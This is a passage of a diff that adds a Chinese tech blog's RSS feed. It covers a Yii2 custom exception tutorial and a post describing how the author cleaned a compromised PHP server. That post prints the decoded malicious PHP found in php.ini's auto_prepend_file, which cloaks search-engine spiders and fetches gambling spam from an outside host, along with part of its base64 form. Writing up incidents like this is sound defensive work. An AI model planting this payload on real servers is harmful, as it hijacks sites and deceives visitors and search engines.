+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$error_code_list&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * 错误状态返回
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * BaseException constructor.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param int $code 状态码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param null $message 错误信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; __construct( &lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt; = &lt;span style=&#34;color:#b452cd&#34;&gt;500&lt;/span&gt; , &lt;span style=&#34;color:#00688b&#34;&gt;$message&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;( array_key_exists(&lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt;, &lt;span style=&#34;color:#00688b&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;error_code_list&lt;/span&gt;) ){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#00688b&#34;&gt;$message&lt;/span&gt; = &lt;span style=&#34;color:#00688b&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;error_code_list&lt;/span&gt;[&lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;__construct&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#00688b&#34;&gt;$message&lt;/span&gt;, &lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * 根据错误码获取错误信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @param $code integer
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @return mixed
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;getErrorMessage&lt;/span&gt;( &lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;error_code_list&lt;/span&gt;[&lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;BaseException.php&lt;/em&gt;这个衍生的子类可以给控制器或者模型使用，在业务代码内调用。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api\exception;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;BaseException&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; Exception
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; __construct(&lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt; = &lt;span style=&#34;color:#b452cd&#34;&gt;500&lt;/span&gt; , &lt;span style=&#34;color:#00688b&#34;&gt;$message&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;error_code_list&lt;/span&gt; = ErrorCodes::&lt;span style=&#34;color:#658b00&#34;&gt;errorCodeList&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;__construct&lt;/span&gt;( &lt;span style=&#34;color:#00688b&#34;&gt;$code&lt;/span&gt;, &lt;span style=&#34;color:#00688b&#34;&gt;$message&lt;/span&gt; );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;四在业务逻辑内调用&#34;&gt;四、在业务逻辑内调用&lt;/h2&gt;
+&lt;p&gt;这里编写了一个简单的demo，模拟控制器检查到token出错时抛出。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api\controllers;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; yii\rest\Controller;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; app\modules\api\exception\BaseException;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;IndexController&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; Controller{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;actionIndex&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; BaseException(&lt;span style=&#34;color:#b452cd&#34;&gt;401&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;五在模块内注册错误控制类&#34;&gt;五、在模块内注册错误控制类&lt;/h2&gt;
+&lt;p&gt;在模块目录下的&lt;em&gt;Module.php&lt;/em&gt;文件的&lt;em&gt;init&lt;/em&gt;方法中，加入我们自定义的错误控制类&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; app\modules\api;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; app\modules\api\exception\ErrorHandler;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Module&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;extends&lt;/span&gt; \yii\base\Module
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @inheritdoc
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$controllerNamespace&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;app\modules\api\controllers&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     * @inheritdoc
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;     */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;init&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;parent&lt;/span&gt;::&lt;span style=&#34;color:#658b00&#34;&gt;init&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// custom initialization code goes here
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 自定义拦截错误时间拦截注册
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$error_handler&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ErrorHandler();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$error_handler&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;register&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;- https://jadenhsiao.gitee.io/post/yii2-skills-part-three/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>记录一次清理网站挂马</title>
+        <link>https://jadenhsiao.gitee.io/post/clear-website-trojan/</link>
+        <pubDate>Sat, 28 May 2022 10:54:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/clear-website-trojan/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/clear-website-trojan/ -&lt;blockquote&gt;
+&lt;p&gt;某一天，上班上到一半，老板拿着某度APP，过来技术部，跟我们说，公司网站被挂马了，上面全部是菠菜广告；听到老板反馈后，立马开始排查，但是使用普通浏览器访问又看不到内容；于是乎就有下面清理历程了。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-05-28_11-31-54.jpg&#34; alt=&#34;挂马内容&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;问题一只有某度app打开才复现问题&#34;&gt;问题一：只有某度APP打开才复现问题？&lt;/h2&gt;
+&lt;p&gt;很明显就是针对于某度，因为某度会对站点进行爬取收录（这方面涉及到了SEO相关），而且从挂马内容看都是搜索热词；直接浏览器打开看不到内容，具有隐秘性；对此，我找了个某度爬虫的请求头，然后使用chrome的一款可以修改请求头的拓展 ModHeader，来看下能不能复现内容。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-05-28_11-38-31.jpg&#34; alt=&#34;修改请求头&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上面这张图就是使用 ModHeader，把请求的 User-Agent 修改为某度的爬虫请求头，然后请求被挂马的站点，发现问题复现了，下面的文本就是某度的 UA 请求头。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Mozilla/5.0 (compatible; **iduspider2; +http://www.**idu.com/search/spider.html)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;问题二内容动态变化而且源码找不到网络请求&#34;&gt;问题二：内容动态变化，而且源码找不到网络请求？&lt;/h2&gt;
+&lt;p&gt;专门从服务器把代码下载下来，翻箱倒柜的找代码，任何涉及到有http请求的都不放过，可是，就是没找到内容。这就纳闷了；找源码无果后，尝试在项目的目录下新建了个再普通不过的php脚本，内容就输出打印，然后die掉。
+结果发现还是输出了挂马内容，很明显，这已经不是项目代码的问题了，是php-fpm的问题了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-05-19_18-22-09.jpg&#34; alt=&#34;测试脚本&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后没过多久，老板打电话来说，同一台服务器的网站也出现同样的情况了，然后上去看了下，都是用着上古php5.6，就更加证明上面的推测是正确的。&lt;/p&gt;
+&lt;h2 id=&#34;问题三没有文件到底是在哪里注入&#34;&gt;问题三：没有文件，到底是在哪里注入？&lt;/h2&gt;
+&lt;p&gt;既然没有文件，而且又有网络请求，而且这么多网站都有，那么必定会引起网络IO堵塞，所以就想到了服务器上的php是开启了慢日志的，然后翻了下慢日志，果不其然，找到了这段因为可疑的base64字符串（部分内容涉及到菠菜的已经被我删掉了）。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;data:;base64,PD9waHAKQG9iX3N0YXJ0ICgpOwpAc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CiR0ciA9ICJzdHJpc3RyIjsKJGVyID0gJF9TRVJWRVI7CmZ1bmN0aW9uIGh0dHBHZXRsYWkoJHVybCkgewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgQmFpZHVzcGlkZXIvMi4wOyAraHR0cDovL3d3dy5iYWlkdS5jb20vc2VhcmNoL3NwaWRlci5odG1sKScpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBGQUxTRSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIEZBTFNFKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看到base64字符串，立马对字符串进行转码，果不其然，发现了http请求的代码。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+@ob_start ();
+@set_time_limit(0);
+error_reporting(0);
+header(&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;);
+$tr = &amp;quot;stristr&amp;quot;;
+$er = $_SERVER;
+function httpGetlai($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&#39;);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+define(&#39;url&#39;, $er[&#39;REQUEST_URI&#39;]);
+@define(&#39;ref&#39;, $er[&#39;HTTP_REFERER&#39;]);
+define(&#39;ent&#39;, $er[&#39;HTTP_USER_AGENT&#39;]);
+define(&#39;site&#39;, &amp;quot;http://www.xxx.com/&amp;quot;);
+define(&#39;road&#39;, &amp;quot;?&amp;quot; .$er[&#39;HTTP_HOST&#39;] . url);
+define(&#39;regs&#39;, &#39;@Baidu|Sogou|Yisou|Haosou|Spider|So.com|Sm.cn@i&#39;);
+define(&#39;mobile&#39;, &#39;/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/&#39;);
+define(&#39;area&#39;, $tr(url, &amp;quot;.xml&amp;quot;) or $tr(url, &amp;quot;.doc&amp;quot;) or $tr(url, &amp;quot;.pdf&amp;quot;) or $tr(url, &amp;quot;.txt&amp;quot;) or $tr(url, &amp;quot;.ppt&amp;quot;) or $tr(url, &amp;quot;.pptx&amp;quot;) or $tr(url, &amp;quot;.xls&amp;quot;) or $tr(url, &amp;quot;.csv&amp;quot;) or $tr(url, &amp;quot;.shtml&amp;quot;) or $tr(url, &amp;quot;.tacc&amp;quot;)or $tr(url, &amp;quot;.ga&amp;quot;)or $tr(url, &amp;quot;.gq&amp;quot;)or $tr(url, &amp;quot;.xlsx&amp;quot;)or $tr(url, &amp;quot;.bug&amp;quot;) or $tr(url, &amp;quot;.fdc&amp;quot;) or $tr(url, &amp;quot;.znb&amp;quot;) or $tr(url, &amp;quot;.msl&amp;quot;) or $tr(url, &amp;quot;.mdb&amp;quot;) or $tr(url, &amp;quot;.cnm&amp;quot;) or $tr(url, &amp;quot;.love&amp;quot;) and $tr(url, &amp;quot;?&amp;quot;));
+if (preg_match(regs, ent)) {
+    if (area) {
+        echo httpGetlai(site.road);
+        exit;
+    } else {
+        echo httpGetlai(site.&#39;x.php&#39;);
+        ob_flush();flush();
+    }
+}
+if (area){
+    if (preg_match(mobile, ent)){
+        $Content_mb=file_get_contents(&amp;quot;http://www.xxx.com/&amp;quot;);
+        echo $Content_mb;
+        exit;
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;顺着代码逻辑拼接请求，是挂马的内容。&lt;/p&gt;
+&lt;h2 id=&#34;问题四到底是哪里被修改了&#34;&gt;问题四：到底是哪里被修改了？&lt;/h2&gt;
+&lt;p&gt;在一头雾水的时候，翻了下php的官网，看了下php.ini的文档说明；有个惊喜的发现，就是auto_prepend_file设置，按照官方文档的说法就是每次脚本文件调用前都会先调用该文件，就例如include。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-05-28_12-46-20.jpg&#34; alt=&#34;auto_prepend_file&#34;&gt;
+那问题就可能出自这里了，因为上面测试的时候，一个再普通的打印脚本都能被注入挂马；立马去翻了下对应版本的php.ini，果不其然，auto_prepend_file被赋上了那串base64字符串了，将对应的内容清理，重启fpm，完美处理。&lt;/p&gt;
+&lt;h2 id=&#34;反思&#34;&gt;反思&lt;/h2&gt;
+&lt;p&gt;对于php，有些高危的函数是要进行屏蔽的；想这次被挂马就是调用了base64_decode、eval，此类可以执行字符串和转码的函数，必要时对服务器进行加固，道高一尺魔高一丈，这次清挂马就跟在捉迷藏一样。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/clear-website-trojan/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>微信开发技巧之文件上传</title>
+        <link>https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/</link>
